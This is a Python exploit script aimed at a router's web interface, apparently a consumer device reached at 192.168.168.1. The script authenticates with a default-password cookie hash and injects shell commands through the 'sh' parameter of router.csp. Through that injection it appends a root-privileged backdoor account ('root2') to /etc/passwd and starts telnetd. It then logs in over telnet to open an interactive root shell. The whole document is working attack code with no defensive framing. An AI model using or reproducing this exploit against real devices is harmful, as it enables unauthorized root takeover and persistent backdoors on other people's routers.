#!/usr/bin/env python3
import requests, sys
from urllib.parse import quote
from time import sleep
from telnetlib import Telnet


# default hash for admin password
# hash is md5("admin"+password)
def exec_cmd(cmd, host="192.168.168.1", usrid="f6fdffe48c908deb0f4c3bd36c032e72"):

    payload = f"""';{cmd};#"""
    payload = quote(payload)


    headers = {"Cookie" : f"lstatus=true; usrid={usrid}" }

    url = f"http://{host}/router.csp?fname=net&opt=wifi_lt&function=set&enable=1&time_on=1&week=1100000&sh={payload}&sm=7&eh=6&em=0&math=0.8363175084122203"

    r = requests.post(url, headers=headers)
    if not """"error": 0""" in r.text:
        print("[!] Error executing command.")
        return False
    return True



if len(sys.argv) >= 2:
    host  = sys.argv[1]
    if len(sys.argv) == 3:
        usrid = sys.argv[2]
    else:
        # default usrid for password `admin`
        usrid = "f6fdffe48c908deb0f4c3bd36c032e72"
else:
    host = "192.168.168.1"
    usrid = "f6fdffe48c908deb0f4c3bd36c032e72"


def login_telnet(host="192.168.168.1"):
    try:
        with Telnet(host, 23) as tn:
            tn.read_until(b"login: ")
            tn.write("root2".encode("ascii") + b"\n")
            tn.read_until(b"Password: ")
            tn.write("mrcake".encode("ascii") + b"\n")
            tn.interact()
    except:
        print("[!] Error connecting to telnet server.")
        return False
    return True

print(f"[*] Adding backdoor user and enabling telnet...")
if exec_cmd("""echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/sh" >> /etc/passwd;telnetd""") == True:
    print(f"[+] Execution worked")
    print(f"[*] Now sleeping for a short period until machine comes back up")
    for i in range(5):
        sleep(20)
        if login_telnet() == True:
            break

